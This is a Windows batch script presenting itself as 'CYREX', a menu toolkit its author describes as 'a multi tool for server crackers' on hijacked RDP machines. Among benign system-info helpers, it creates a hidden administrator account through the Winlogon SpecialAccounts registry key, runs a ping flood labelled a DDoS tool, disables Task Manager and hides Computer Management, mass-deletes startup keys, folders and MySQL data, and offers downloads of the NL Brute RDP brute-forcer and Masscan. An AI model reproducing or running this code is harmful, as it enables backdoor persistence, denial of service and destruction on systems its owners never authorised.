<!-- :: 
@echo off
::______________________________________________ 
 
::  ██████╗██╗   ██╗██████╗ ███████╗██╗  ██╗
:: ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝╚██╗██╔╝
:: ██║      ╚████╔╝ ██████╔╝█████╗   ╚███╔╝ 
:: ██║       ╚██╔╝  ██╔══██╗██╔══╝   ██╔██╗ 
:: ╚██████╗   ██║   ██║  ██║███████╗██╔╝ ██╗
::  ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
::______________________________________________                                      
::========================================================================================================

:menu
TITLE        .::(  C Y R E X   :   V 1.4.4  )::.
mode 120,80
color 0A
cls
echo.
ECHO                     ______  __   __   ______   ______  __     __   
ECHO                    ^|          \_/    ^|_____/  ^|______    \___/    
ECHO                    ^|______     ^|     ^|    \_  ^|______  __/   \__ 
echO.
echo                    ___________    _________________________
echo                   ^|           ^|  ^|                         ^|
echo                   ^| C Y R E X ^|  ^|   M e r c a d s . i r   ^|
echo                   ^|___________^|  ^|_________________________^|
echo                    _________________________    ___________
echo                   ^|                         ^|  ^|           ^|
echo                   ^|       CMD_TOOLBOX       ^|  ^|  V 1.4.4  ^|
echo                   ^|_________________________^|  ^|___________^|
echo.
echo.
echo                   ____________________________________________________________________________
echo.
echo                     [A] Fake file creator                 [N] Unzip tool                                
echo                     [B] Hidden user maker                 [O] Direct link downloader                                  
echo                     [C] Change server password            [P] AES-256 (ENCODE - DECODE)
echo                     [D] Open Task manager and CMD         [Q] BASE 64 (ENCODE - DECODE)      
echo                     [E] Locker delete                     [R] Task manager   (ON-OFF)        
echo                     [F] Web IP scanner + Ddoser           [S] Computer Management (ON-OFF)   
echo                     [G] Get CPU name                      [T] Advanced CPU details ^| System info           
echo                     [H] Get system language               [U] Show installed apps             
echo                     [I] Get OS version                    [V] Download Center                 
echo                     [J] Get username                      [W] Speed check - Whats my ip?      
echo                     [K] Get computer name                 [X] Restart System                  
echo                     [L] System type (32-64 bit)           [Y] About                           
echo                     [M] Speaker                           [Z] Exit                            
echo                   ____________________________________________________________________________
echo. 
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
choice /C:ABCDEFGHIJKLMNOPQRSTUVWXYZ /N /M " "


if errorlevel 26 goto exit
if errorlevel 25 goto about
if errorlevel 24 goto seres
if errorlevel 23 goto internetchk
if errorlevel 22 goto dlcr
if errorlevel 21 goto insapp
if errorlevel 20 goto advcpu
if errorlevel 19 goto comman
if errorlevel 18 goto tskmgr
if errorlevel 17 goto base64
if errorlevel 16 goto aes256
if errorlevel 15 goto dlman
if errorlevel 14 goto unzip
if errorlevel 13 goto speak
if errorlevel 12 goto sysbit
if errorlevel 11 goto comname
if errorlevel 10 goto username
if errorlevel 9 goto osver
if errorlevel 8 goto pclng
if errorlevel 7 goto cpuname
if errorlevel 6 goto webddos
if errorlevel 5 goto lockdel
if errorlevel 4 goto tskcmd
if errorlevel 3 goto chngpass
if errorlevel 2 goto hidden
if errorlevel 1 goto fake
::========================================================================================================
:fake
cls
echo ------------------------------------------------------------------------
echo                     F A K E   F I L E   C R E A T O R                    
echo ------------------------------------------------------------------------
echo.
echo.
echo.
echo Tip: This part creates fake file in desktop
echo you most create fake file then move it to your target!!
echo.
echo    Please Enter Your File Name and press ENTER.
set /p "filename=>>>"
echo ------------------------------------------------------------------
echo    Please Enter Your File Type and press ENTER.
echo    Don't using "." !!!!
echo    File Types: rar-zip-exe-txt-jpg-png-pdf-mp3-mp4-html-php-py And More... !
set /p "filetype=>>>"
echo ------------------------------------------------------------------
echo    Please Enter Your File Size and press ENTER.
echo.
echo.
echo   1073741824     =  1GB
echo   2147483648     =  2GB
echo   5368709120     =  5GB
echo   10737418240    =  10GB
echo   53687091200    =  50GB
echo   107374182400   =  100GB
echo   1073741824000  =  1TB
echo or custum...
echo.
set /p "filesize=>>>"
echo ------------------------------------------------------------------
c:
cd\
cd c:\users\%username%\desktop\
mkdir Fake
fsutil file createnew C:\users\%username%\desktop\Fake\%filename%.%filetype% %filesize%
start Fake
echo.
echo.
echo Your fake file created!

choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu
exit
::========================================================================================================
:hidden
cls
echo ------------------------------------------------------------------------
echo                        H I D D E N   U S E R
echo ------------------------------------------------------------------------
echo.
echo.
echo.
set /p user=Please Enter Username :  
set /p pass=Please Enter Password : 
echo.
net user /add %user% %pass%
net localgroup administrators /add %user%
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v %user% /t REG_DWORD /d 0
echo.
echo Your hidden user created!
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu
::========================================================================================================
:chngpass
cls
echo ------------------------------------------------------------------------
echo                     P A S S W O R D   C H A N G E R
echo ------------------------------------------------------------------------
echo.
echo.
echo enter username:
set /p "usernamer=>>>"
echo enter new password:
set /p "passrr=>>>"
net user %usernamer% %passrr%
echo.
echo completed
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu
::========================================================================================================
:tskcmd
cls
echo ------------------------------------------------------------------------
echo                  T A S K  M A N G E R - C M D
echo ------------------------------------------------------------------------
echo.
echo.
echo.
echo.
echo.
echo Press [A] for CMD
echo press [B] for taskmanager
echo press [C] for menu
echo press [D] for exit


choice /C:ABCD /N /M "Press [A] or [B] or [C] or [D] "

if errorlevel 4 goto exit
if errorlevel 3 goto menu
if errorlevel 2 goto tskst
if errorlevel 1 goto cmst

:tskst
taskmgr
goto menu
:cmst
start
goto menu
::========================================================================================================
:lockdel
@ECHO OFF
cls
echo ------------------------------------------------------------------------
echo                        L O C K E R   D E L E T E
echo ------------------------------------------------------------------------
echo.
echo.
echo.
echo.
echo Press any key...
PAUSE > nul
REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"  /f
REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Runonce"  /f
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"  /f
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"  /f
REG DELETE "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Run"  /f
REG DELETE "HKEY_CURRENT_USER\Software\Classes\VirtualStore\MACHINE\SOFTWARE\Wow6432Node\TopLang\Desktop Lock Express"  /f
REG DELETE "HKEY_CURRENT_USER\Software\TopLang\Desktop Lock Express"  /f
REG DELETE "HKEY_CURRENT_USER\Software\TopLang\Desktop Lock Express\Registration"  /f
REG DELETE "HKEY_CURRENT_USER\Software\TopLang\Desktop Lock Express"  /f
REG DELETE "HKEY_CURRENT_USER\Software\TopLang\Desktop Lock Express\Registration"  /f
REG DELETE "HKLM\System\CurrentControlSet\Services\BootDriver "  /f
REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Performances"  /f
REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\services\Performances"  /f
RMDIR /s/q C:\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Windows
erase /Q C:\Users\%UserName%\AppData\Roaming\Microsoft\Windows
RMDIR /s/q "C:\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
RMDIR /s/q "C:\Users\%UserName%\AppData\Local\DeskLock"
mkdir "C:\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
erase /Q "C:\Users\%UserName%\Downloads"
rename C:\Windows\Fonts\svchost.exe xuy_sosy.exe
DEL /F /S /Q /A "C:\Windows\Fonts\svchost.exe"
DEL /F /S /Q /A "C:\Windows\Fonts\xuy_sosy.exe"
DEL /F /S /Q /A "C:\ProgramData\MySQL\*.*"
SetLocal EnableExtensions

For /F "Tokens=2*" %%I In ('Reg Query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" /V ProfilesDirectory') Do Set Profiles=%%J
Call Set Profiles=%Profiles%

For /F "Delims=" %%I In ('Dir /B /AD-S-H "%Profiles%" ^| FindStr /V /B /I /C:"All Users"') Do (
  Del /F /S /Q "%Profiles%\%%I\Local Settings\Temp\*.*"
  Del /F /S /Q "%Profiles%\%%I\Local Settings\Temporary Internet Files\*.*"

  Del /F /S /Q "%Profiles%\%%I\AppData\Local\Temp\*.*"
  Del /F /S /Q "%Profiles%\%%I\AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*"
)
echo.
echo.
echo    Locker delete completed!
echo.
echo.
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu
::========================================================================================================
:webddos
cls
echo ------------------------------------------------------------------------
echo                      D D O S   -   W E B  I P  S C A N
echo ------------------------------------------------------------------------
echo.
echo.
echo.
choice /C:ABC /N /M "Press [A] for ddos or [B] for web-ip-scan or [C] for menu"

if errorlevel 3 goto menu
if errorlevel 2 goto iptst
if errorlevel 1 goto ddos

:ddos
@echo off
cls
echo ------------------------------------------------------------------------
echo                          D D O S     T O O L
echo ------------------------------------------------------------------------
ECHO.  
ECHO. 
set /p ip=Target Ip For DDOS :
set /p size=Packet Size (5600 MAX SIZE) :
ping %ip% -t -l %size%
echo.
echo.
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu
:iptst
@echo off
cls
echo ------------------------------------------------------------------------
echo                        W E B  I P   S C A N N E R
echo ------------------------------------------------------------------------
set /p url=WebSite (URL) :
ping %url%
echo    Ip scan url complete!
echo.
echo.
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu
::========================================================================================================
:username
cls
echo ------------------------------------------------------------------------
echo                        U S E R N A M E
echo ------------------------------------------------------------------------
echo.
echo.
echo.
%extd% /getusername

if "%result%"=="" (exit) else (set username="%result%")

%extd% /messagebox "User name" %username%
goto menu
:pclng
cls
echo ------------------------------------------------------------------------
echo                        P C   L A N G U A G E
echo ------------------------------------------------------------------------
%extd% /getsystemlanguage

if "%result%"=="" (exit) else (set syslang="%result%")

%extd% /messagebox "System Language" %syslang%
goto menu
::========================================================================================================
:osver
cls
echo ------------------------------------------------------------------------
echo                        O S   V E R S I O N
echo ------------------------------------------------------------------------
@ECHO OFF
REM  QBFC Project Options Begin
REM  HasVersionInfo: No
REM  Companyname: 
REM  Productname: 
REM  Filedescription: 
REM  Copyrights: 
REM  Trademarks: 
REM  Originalname: 
REM  Comments: 
REM  Productversion:  0. 0. 0. 0
REM  Fileversion:  0. 0. 0. 0
REM  Internalname: 
REM  Appicon: 
REM  AdministratorManifest: No
REM  QBFC Project Options End
@ECHO ON
@echo off

if "%b2eprogramfilename%"==""  (

	echo To see any results you need to convert this file into an exe
	pause
	goto :eof

)

%extd% /osversion

if "%result%"=="" (exit) else (set os="%result%")

%extd% /messagebox "Operating system" %os%
goto menu
::========================================================================================================
:cpuname
cls
echo ------------------------------------------------------------------------
echo                        C P U    N A M E
echo ------------------------------------------------------------------------
%extd% /getcpuname

if "%result%"=="" (exit) else (set cpuname="%result%")

%extd% /messagebox "CPU name" %cpuname%
echo.
echo.
goto menu
::========================================================================================================
:comname
cls
echo ------------------------------------------------------------------------
echo                        C O M P U T E R   N A M E
echo ------------------------------------------------------------------------
%extd% /getcomputername

if "%result%"=="" (exit) else (set computername="%result%")

%extd% /messagebox "Computer name" %computername%
goto menu
::========================================================================================================
:sysbit
cls
echo ------------------------------------------------------------------------
echo                        6 4 - B I T    3 2 - B I T
echo ------------------------------------------------------------------------
%extd% /is64bit

IF %result% EQU 1  (
	%extd% /messagebox Result "Your operating system is 64 Bit"
) ELSE (
	%extd% /messagebox Result "Your operating system is 32 Bit"
)
goto menu
::========================================================================================================
:speak
cls
echo ------------------------------------------------------------------------
echo                        S P E A K
echo ------------------------------------------------------------------------

%extd% /inputbox "" "Enter the text you want to be spoken in the box below" ""

if "%result%"=="" (exit) else (set string="%result%")

%extd% /speak %string% 2
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu
::========================================================================================================
:unzip
cls
echo ------------------------------------------------------------------------
echo                        U N Z I P P E R
echo ------------------------------------------------------------------------
msg * "notice: Just for zip files not Rar!!!!"
%extd% /browseforfile "Select a ZIP file" "" "ZIP (*.zip)|*.zip"

if "%result%"=="" (exit) else (set file="%result%")

%extd% /browseforfolder "Select a destination folder" "c:\"

if "%result%"=="" (exit) else (set folder="%result%")

%extd% /unzip %file% %folder%
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu
::========================================================================================================
:dlman
cls
echo ------------------------------------------------------------------------
echo                        D I R E C T  D O W N L O A D E R
echo ------------------------------------------------------------------------
cd %~dp0

%extd% /inputbox "Download Manager" "Enter the Url you want to download" "Enter Direct Link"

if "%result%"=="" (exit) else (set url="%result%")

%extd% /savefiledialog "Save file as" "downloaded" "All Files (*.*)|*.*"

if "%result%"=="" (exit) else (set file="%result%")

%extd% /download %url% %file%

if %result% EQU 0  (
	%extd% /messagebox Error "Download failed" 16
) ELSE (
	%extd% /messagebox Done "Download succeeded"
)
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu
::========================================================================================================
:aes256
cls
echo ------------------------------------------------------------------------
echo                        A E S   2 5 6
echo ------------------------------------------------------------------------
echo.
echo.
echo.
echo.
choice /C:AB /N /M "Press [A] for Decode and [B] for Encode "

if errorlevel 2 goto aesen
if errorlevel 1 goto aesde
:aesde
cls
echo ------------------------------------------------------------------------
echo                        A E S   D E C O D E
echo ------------------------------------------------------------------------
%extd% /browseforfile "Select a file" "" "All Files (*.*)|*.*"

if "%result%"=="" (exit) else (set file="%result%")

%extd% /savefiledialog "Save file as" "" "All Files (*.*)|*.*"

if "%result%"=="" (exit) else (set save="%result%")

%extd% /inputbox "" "Enter the key" "mykey"

if "%result%"=="" (exit) else (set key="%result%")

%extd% /aesdecode %file% %save% %key%
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu

:aesen
cls
echo ------------------------------------------------------------------------
echo                        A E S  E N C O D E
echo ------------------------------------------------------------------------
%extd% /browseforfile "Select a file" "" "All Files (*.*)|*.*"

if "%result%"=="" (exit) else (set file="%result%")

%extd% /savefiledialog "Save file as" "MyFile." "All Files (*.*)|*.*"

if "%result%"=="" (exit) else (set save="%result%")

%extd% /inputbox "" "Enter the key" "mykey"

if "%result%"=="" (exit) else (set key="%result%")

%extd% /aesencode %file% %save% %key%
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu
::========================================================================================================
:base64
cls
echo ------------------------------------------------------------------------
echo                        B A S E     6 4
echo ------------------------------------------------------------------------
echo.
echo.
echo.
echo.
choice /C:AB /N /M "Press [A] for Decode and [B] for Encode "

if errorlevel 2 goto basen
if errorlevel 1 goto basde

:basen
cls
echo ------------------------------------------------------------------------
echo                        B A S E 6 4   E N C O D E
echo ------------------------------------------------------------------------
%extd% /browseforfile "Select a file" "" "All Files (*.*)|*.*"

if "%result%"=="" (exit) else (set file="%result%")

%extd% /savefiledialog "Save file as" "" "All Files (*.*)|*.*"

if "%result%"=="" (exit) else (set save="%result%")

%extd% /base64encode %file% %save%
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu

:basde
cls
echo ------------------------------------------------------------------------
echo                        B A S E 6 4  D E C O D E
echo ------------------------------------------------------------------------
%extd% /browseforfile "Select a file" "" "All Files (*.*)|*.*"

if "%result%"=="" (exit) else (set file="%result%")

%extd% /savefiledialog "Save file as" "" "All Files (*.*)|*.*"

if "%result%"=="" (exit) else (set save="%result%")

%extd% /base64decode %file% %save%
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu
::========================================================================================================
:TSKMGR
cls
echo ------------------------------------------------------------------------
echo                          T A S K   M A N G E R
echo ------------------------------------------------------------------------
echo.
echo.
echo.
echo.
choice /C:AB /N /M "Press [A] for ON and [B] for OFF "

if errorlevel 2 goto tskoff
if errorlevel 1 goto tskon

:tskoff
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskmgr /t REG_DWORD /d 1 /f
echo.
echo.
echo    COMPLETE
echo.
echo.
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu
:tskon
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskmgr /t REG_DWORD /d 0 /f
echo.
echo.
echo    COMPLETE
echo.
echo.
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu
::========================================================================================================
:comman
cls
echo ------------------------------------------------------------------------
echo                C O M P U T E R   M A N A G E M E N T 
echo ------------------------------------------------------------------------
echo.
echo.
echo.
echo.
choice /C:AB /N /M "Press [A] for ON and [B] for OFF "

if errorlevel 2 goto comoff
if errorlevel 1 goto comon

:comoff

move "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Administrative Tools\Computer Management.lnk" "C:\windows\1.bc"
echo.
echo.
echo    COMPLETE
echo.
echo.
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu
:comon

move "C:\windows\1.bc" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Administrative Tools\Computer Management.lnk"
echo.
echo.
echo    COMPLETE
echo.
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu
::========================================================================================================
:seres
cls
echo ------------------------------------------------------------------------
echo                     S E R V E R  R E S T A R T
echo ------------------------------------------------------------------------
echo.
echo.
echo.
choice /C:AB /N /M "Press [A] for menu and [B] for restart server "

if errorlevel 2 goto seresdo
if errorlevel 1 goto menu
:seresdo
echo Your Server (or PC) will restarted now...
echo please wait...
shutdown -r
::========================================================================================================
:insapp
cls
echo ------------------------------------------------------------------------
echo              I N S T A L L E D   A P P L I C A T I O N S
echo ------------------------------------------------------------------------
echo.
echo.
echo.
echo.
echo		NOTICE: This process take less than 1 minute time, so be patient!
echo.
echo.
echo.
wmic product get name
echo.
echo.
pause
echo.
echo.
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu
::========================================================================================================
:advcpu
cls
echo ------------------------------------------------------------------------
echo                   A D V A N C E D   S Y S T E M   I N F O
echo ------------------------------------------------------------------------
echo.
echo.
echo.
echo 		Here is Advanced CPU Details:
echo.
echo.
choice /C:AB /N /M "Press [A] for CPU and [B] for SYSTEM "

if errorlevel 2 goto systeminfo
if errorlevel 1 goto cpuinfos

:cpuinfos
cls
wmic cpu get /format:list
echo.
echo.
echo.
pause

echo.
echo.
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu

:systeminfo
cls
systeminfo
echo.
echo.
echo.
pause

echo.
echo.
choice /C:AB /N /M "Press [A] for menu and [B] for exit "

if errorlevel 2 goto exit
if errorlevel 1 goto menu
::========================================================================================================
:dlcr
cls
echo ------------------------------------------------------------------------
echo                     D O W N L O A D    C E N T E R
echo ------------------------------------------------------------------------
echo.
echo.
echo.
echo.
echo 		dont close the application before finish downloading.
echo.
echo 		your downloaded files created in this directory or here (C:\users\%username%\downloads)
echo.
echo 		Here you can download your important server-apps:
echo.
echo.
echo 			1-NL Brute
echo 			2-K-Port Scan
echo 			3-Masscan
echo 			4-Dont sleep
echo 			5-Mozila Firefox
echo 			6-Cryptotab
echo.
echo.
echo.
set /p "shshs=>>>"
if %shshs%==1 goto nldl
if %shshs%==2 goto kpdl
if %shshs%==3 goto msdl
if %shshs%==4 goto dsdl
if %shshs%==5 goto mfdl
if %shshs%==6 goto ctdl
echo.
echo.
echo Wrong select!
goto cdlm

:nldl

if "%b2eprogramfilename%"==""  (

	echo To see any results you need to convert this file into an exe
	pause
	goto :eof

)

cd %~dp0

%extd% /messagebox  "Downloader" "  @Insane_Lord  |  downloading NLBRUTE?  " 1

IF %result% EQU 1  (
	%extd% /download "site-put.re" "NLBRUTE.zip"
) ELSE (
       exit
)

IF %result% EQU 0  (
	%extd% /messagebox Error "Download failed" 16
) ELSE (
	%extd% /messagebox Done "Download succeeded"
)
goto menu
:kpdl

if "%b2eprogramfilename%"==""  (

	echo To see any results you need to convert this file into an exe
	pause
	goto :eof

)

cd %~dp0

%extd% /messagebox  "Downloader" "  @Insane_Lord  |  downloading K-Port Scan?  " 1

IF %result% EQU 1  (
	%extd% /download "site-put.re" "K-PORT.zip"
) ELSE (
       exit
)

IF %result% EQU 0  (
	%extd% /messagebox Error "Download failed" 16
) ELSE (
	%extd% /messagebox Done "Download succeeded"
)
goto menu
:msdl

if "%b2eprogramfilename%"==""  (

	echo To see any results you need to convert this file into an exe
	pause
	goto :eof

)

cd %~dp0

%extd% /messagebox  "Downloader" "  @Insane_Lord  |  downloading MASSCAN?  " 1

IF %result% EQU 1  (
	%extd% /download "site-put.re" "masscan.zip"
) ELSE (
       exit
)

IF %result% EQU 0  (
	%extd% /messagebox Error "Download failed" 16
) ELSE (
	%extd% /messagebox Done "Download succeeded"
)
goto menu
:dsdl

if "%b2eprogramfilename%"==""  (

	echo To see any results you need to convert this file into an exe
	pause
	goto :eof

)

cd %~dp0

%extd% /messagebox  "Downloader" "  @Insane_Lord  |  downloading DONT SLEEP?   " 1

IF %result% EQU 1  (
	%extd% /download "site-put.re" "dontsleep.zip"
) ELSE (
       exit
)

IF %result% EQU 0  (
	%extd% /messagebox Error "Download failed" 16
) ELSE (
	%extd% /messagebox Done "Download succeeded"
)
goto menu
:mfdl

if "%b2eprogramfilename%"==""  (

	echo To see any results you need to convert this file into an exe
	pause
	goto :eof

)

cd %~dp0

%extd% /messagebox  "Downloader" "  @Insane_Lord  |  downloading Mozila firefox?  " 1

IF %result% EQU 1  (
	%extd% /download "site-put.re" "mozila.zip"
) ELSE (
       exit
)

IF %result% EQU 0  (
	%extd% /messagebox Error "Download failed" 16
) ELSE (
	%extd% /messagebox Done "Download succeeded"
)
goto menu
:ctdl

if "%b2eprogramfilename%"==""  (

	echo To see any results you need to convert this file into an exe
	pause
	goto :eof

)

cd %~dp0

%extd% /messagebox  "Downloader" "  @Insane_Lord  |  downloading Crypto tab?  " 1

IF %result% EQU 1  (
	%extd% /download "site-put.re (or dif crypto site)" "crypto.zip"
) ELSE (
       exit
)

IF %result% EQU 0  (
	%extd% /messagebox Error "Download failed" 16
) ELSE (
	%extd% /messagebox Done "Download succeeded"
)
goto menu
::========================================================================================================
:internetchk
cls
echo ------------------------------------------------------------------------
echo             S P E E D   C H E C K   -   W H A T S  M Y   I P ?
echo ------------------------------------------------------------------------
cls

choice /C:AB /N /M "Press [A] for speedcheck and [B] for check ip-address "

if errorlevel 2 goto myip
if errorlevel 1 goto spdchk

:spdchk
cls
start https://speedcheck.net
exit

:myip
cls
start https://whatsmyip.com
exit
::========================================================================================================
:about
cls
color 80
echo ------------------------------------------------------------------------
echo                                A B O U T
echo ------------------------------------------------------------------------
echo. 
echo.
echo  "------------------------------------------------------------------------"
echo  "  __  __                         _   _    _ _     _     _      _   _    "
echo  " |  \/  |                       | | | |  | (_)   | |   | |    | \ | |   "
echo  " | \  / | ___ _ __ ___  __ _  __| | | |__| |_  __| | __| | ___|  \| |   "
echo  " | |\/| |/ _ \ '__/ __|/ _` |/ _` | |  __  | |/ _` |/ _` |/ _ \ . ` |   "
echo  " | |  | |  __/ |  \__ \ (_| | (_| | | |  | | | (_| | (_| |  __/ |\  |   "
echo  " |_|  |_|\___|_|  |___/\__,_|\__,_| |_|  |_|_|\__,_|\__,_|\___|_| \_|   "
echo  "                                                                        "
echo  "                                                                        "
echo  "------------------------------------------------------------------------"
echo.
echo.
echo    ----------------------------------------------
echo    Username:  %username% !
echo    ----------------------------------------------
echo    Welcome to CYREX rdp tools 
echo    ----------------------------------------------
echo    This program Coding finished in:25/10/2019
echo    ----------------------------------------------
echo    updates: 1.0.1 - 1.1   - 1.1.2 - 1.1.3 - 1.1.5
echo             1.1.6 - 1.1.7 - 1.1.8 - 1.1.9 - 1.2.1
echo             1.2.2 - 1.3.1 - 1.3.2 - 1.4   - 1.4.3
echo             1.4.4
echo    ----------------------------------------------
echo    Current Version:       1.4.4
echo    ----------------------------------------------
echo    Big update note1: 1.2.1
echo    1-Bugs fixed
echo    2-added more commands
echo    3-fix proplems with windows server 2008 R2
echo    4-interface upfate
echo    ----------------------------------------------
echo    Update note: 1.4.3
echo    1-change name ("S3RV3R T00LS" to " C Y R E X ") 
echo    2-New bugs fixed
echo    3-deleted bad and unuseable commands
echo    4-interface update II
echo.
echo          ***
echo.
echo    Wait for new updates! 
echo    report bugs to admin plz
echo    updates coming soon as possible!!
echo          ***
echo    if you have a good command contact to admin and we add
echo    the command in our script with your favorite name!!!!
echo    ----------------------------------------------
echo    Programmer:
echo    Mer$ad HiddeN     Telegram: @Insane_Lord
echo    ----------------------------------------------
echo    Contact:
echo.
echo    Telegram:    Https://T.me/Batch_Coder
echo    ----------------------------------------------
echo    This program is a multi tool for server crackers!
echo    These programs and files created by this program is completely safe and virus-free.
echo.
choice /C:ABC /N /M "Press [A] for menu and [B] for exit and [C] for my telegram "

if errorlevel 3 goto tlg
if errorlevel 2 goto exit
if errorlevel 1 goto menu
::========================================================================================================
:exit
msg * " Thank you Using this script    -    @Insane_Lord "!!
exit
::========================================================================================================
:tlg
start Https://t.me/Batch_Coder
exit